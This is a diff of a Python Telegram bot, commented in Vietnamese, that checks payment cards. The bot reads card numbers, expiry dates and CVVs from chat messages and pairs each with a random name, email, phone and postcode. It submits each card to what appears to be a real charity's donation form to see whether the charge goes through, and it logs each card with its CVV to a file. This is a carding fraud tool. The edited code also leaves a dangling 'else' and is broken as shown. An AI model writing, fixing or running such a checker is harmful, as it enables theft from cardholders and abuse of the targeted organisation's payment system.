@@ -36,12 +36,17 @@ def random_zipcode():
 
 # Hàm để kiểm tra định dạng thẻ và lấy thông tin
 def extract_card_info(card_input):
-    card_pattern = r'(\d{16})[^\d]*(\d{2})[^\d]*(\d{2})[^\d]*(\d{3})'
+    # Điều chỉnh biểu thức chính quy để nhận cả năm 2 hoặc 4 chữ số
+    card_pattern = r'(\d{16})[^\d]*(\d{2})[^\d]*(\d{2,4})[^\d]*(\d{3})'
     match = re.search(card_pattern, card_input)
     if match:
         cc, mes, ano, cvv = match.groups()
+        # Nếu ano chỉ có 2 chữ số thì thêm "20" vào trước
+        if len(ano) == 2:
+            ano = "20" + ano
         return cc, mes, ano, cvv
     return None
+
 
 # Hàm để tìm thông báo lỗi trong phản hồi
 def extract_error_message(response_text):
@@ -124,6 +129,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_input = update.message.text
     card_info = extract_card_info(user_input)
 
+    if not card_info:
+        return  # Nếu không có thông tin thẻ, bot sẽ không trả lời
+
     with open("allowed_users.txt", "r") as f:
         allowed_users = {int(line.strip()) for line in f.readlines()}
 
@@ -131,83 +139,83 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Người Dùng Không Được Phép Sử Dụng.")
         return
 
-    if card_info:
-        cc, mes, ano, cvv = card_info
+    cc, mes, ano, cvv = card_info
 
-        # Kiểm tra tháng và năm hết hạn
-        current_year = int(datetime.now().strftime("%y"))  # Lấy 2 chữ số cuối năm hiện tại
-        current_full_year = int(datetime.now().strftime("%Y"))  # Lấy 4 chữ số năm hiện tại
-        current_month = int(datetime.now().strftime("%m"))  # Lấy tháng hiện tại
+    # Kiểm tra tháng và năm hết hạn
+    current_year = int(datetime.now().strftime("%y"))  # Lấy 2 chữ số cuối năm hiện tại
+    current_full_year = int(datetime.now().strftime("%Y"))  # Lấy 4 chữ số năm hiện tại
+    current_month = int(datetime.now().strftime("%m"))  # Lấy tháng hiện tại
 
-        if len(ano) == 2:
-            ano = "20" + ano  # Chuyển đổi năm 2 chữ số thành 4 chữ số
-        ano = int(ano)
+    if len(ano) == 2:
+        ano = "20" + ano  # Chuyển đổi năm 2 chữ số thành 4 chữ số
+    ano = int(ano)
 
-        if ano < current_full_year or (ano == current_full_year and int(mes) < current_month):
-            await update.message.reply_text("Tháng hoặc năm hết hạn không hợp lệ.")
-            return
+    if ano < current_full_year or (ano == current_full_year and int(mes) < current_month):
+        await update.message.reply_text("Tháng hoặc năm hết hạn không hợp lệ.")
+        return
 
-        phone = random_num(710000009, 900000009)  # Tạo số điện thoại ngẫu nhiên
-        email = random_email()  # Tạo email ngẫu nhiên
-        name = random_name()  # Tạo tên ngẫu nhiên
-        zipcode = random_zipcode()  # Tạo mã bưu điện ngẫu nhiên
+    phone = random_num(710000009, 900000009)  # Tạo số điện thoại ngẫu nhiên
+    email = random_email()  # Tạo email ngẫu nhiên
+    name = random_name()  # Tạo tên ngẫu nhiên
+    zipcode = random_zipcode()  # Tạo mã bưu điện ngẫu nhiên
 
-        await update.message.reply_text("Đang xử lý thông tin...")
+    await update.message.reply_text("Đang xử lý thông tin...")
 
-        # Gửi yêu cầu tới API
-        async with aiohttp.ClientSession() as session:
-            async with session.post("https://anglicaresa.tfaforms.net/api_v2/workflow/processor",
-                                    data={
-                                        'tfa_4': 'tfa_5',
-                                        'tfa_52': 'tfa_53',
-                                        'tfa_7': 'tfa_317',
-                                        'tfa_19': '1',
-                                        'tfa_20': '',
-                                        'tfa_21': name,  # Tên ngẫu nhiên
-                                        'tfa_23': 'Vu',
-                                        'tfa_27': phone,  # Số điện thoại
-                                        'tfa_2276': zipcode,  # Mã bưu điện
-                                        'tfa_25': email,  # Email
-                                        'tfa_48': 'Web',
-                                        'tfa_50': 'tfa_50',
-                                        'tfa_59': cc,  # Số thẻ
-                                        'tfa_60': mes,  # Tháng hết hạn
-                                        'tfa_70': ano,  # Năm hết hạn
-                                        'tfa_62': cvv,  # CVV
-                                        'tfa_2273': 'G-BCL7XEG4WC',
-                                        'tfa_2274': 'GTM-WMPTRWL',
-                                        'tfa_dbCounters': '785-2252e2e2bdb682ac1beba8ae3f2ff00e',
-                                        'tfa_dbFormId': '151',
-                                        'tfa_dbResponseId': '',
-                                        'tfa_dbControl': '5bcfe3f364f816d947749cc553596cff',
-                                        'tfa_dbWorkflowSessionUuid': '',
-                                        'tfa_dbTimeStarted': '1727426006',
-                                        'tfa_dbVersionId': '29',
-                                        'tfa_switchedoff': 'tfa_2270%2Ctfa_328'
-                                    }) as response:
+    # Gửi yêu cầu tới API
+    async with aiohttp.ClientSession() as session:
+        async with session.post("https://anglicaresa.tfaforms.net/api_v2/workflow/processor",
+                                data={
+                                    'tfa_4': 'tfa_5',
+                                    'tfa_52': 'tfa_53',
+                                    'tfa_7': 'tfa_317',
+                                    'tfa_19': '1',
+                                    'tfa_20': '',
+                                    'tfa_21': name,  # Tên ngẫu nhiên
+                                    'tfa_23': 'Vu',
+                                    'tfa_27': phone,  # Số điện thoại
+                                    'tfa_2276': zipcode,  # Mã bưu điện
+                                    'tfa_25': email,  # Email
+                                    'tfa_48': 'Web',
+                                    'tfa_50': 'tfa_50',
+                                    'tfa_59': cc,  # Số thẻ
+                                    'tfa_60': mes,  # Tháng hết hạn
+                                    'tfa_70': ano,  # Năm hết hạn
+                                    'tfa_62': cvv,  # CVV
+                                    'tfa_2273': 'G-BCL7XEG4WC',
+                                    'tfa_2274': 'GTM-WMPTRWL',
+                                    'tfa_dbCounters': '785-2252e2e2bdb682ac1beba8ae3f2ff00e',
+                                    'tfa_dbFormId': '151',
+                                    'tfa_dbResponseId': '',
+                                    'tfa_dbControl': '5bcfe3f364f816d947749cc553596cff',
+                                    'tfa_dbWorkflowSessionUuid': '',
+                                    'tfa_dbTimeStarted': '1727426006',
+                                    'tfa_dbVersionId': '29',
+                                    'tfa_switchedoff': 'tfa_2270%2Ctfa_328'
+                                }) as response:
 
-                # Lấy nội dung phản hồi
-                response_text = await response.text()
+            # Lấy nội dung phản hồi
+            response_text = await response.text()
 
-                # Kiểm tra chuyển hướng
-                if response.history and response.status == 200:
-                    final_url = str(response.url)
-                    if "success" in final_url:
-                        result_message = "Giao dịch hoàn tất thành công!"
-                    else:
-                        # Tìm thông báo lỗi chỉ sau khi có phản hồi
-                        error_message = extract_error_message(response_text)
-                        result_message = error_message if error_message else "Giao dịch không thành công, vui lòng thử lại."
+            # Kiểm tra chuyển hướng
+            if response.history and response.status == 200:
+                final_url = str(response.url)
+                if "success" in final_url:
+                    result_message = "Giao dịch hoàn tất thành công!"
                 else:
-                    result_message = "Đã xảy ra lỗi trong quá trình giao dịch."
+                    # Tìm thông báo lỗi chỉ sau khi có phản hồi
+                    error_message = extract_error_message(response_text)
+                    result_message = error_message if error_message else "Giao dịch không thành công, vui lòng thử lại."
+            else:
+                result_message = "Đã xảy ra lỗi trong quá trình giao dịch."
 
-                await update.message.reply_text(result_message)
+            await update.message.reply_text(result_message)
 
-                # Ghi log
-                with open("user_logs.txt", "a") as log_file:
-                    log_file.write(f"User ID: {update.effective_user.id}, "
-                                   f"Card: {cc}, Month: {mes}, Year: {ano}, CVV: {cvv}, "
-                                   f"Result: {result_message}\n")
+            # Ghi log
+            with open("user_logs.txt", "a") as log_file:
+                log_file.write(f"User ID: {update.effective_user.id}, "
+                               f"Card: {cc}, Month: {mes}, Year: {ano}, CVV: {cvv}, "
+                               f"Result: {result_message}\n")
+
     else:
         await update.message.reply_text("Thông tin thẻ không hợp lệ. Vui lòng thử lại.")
 
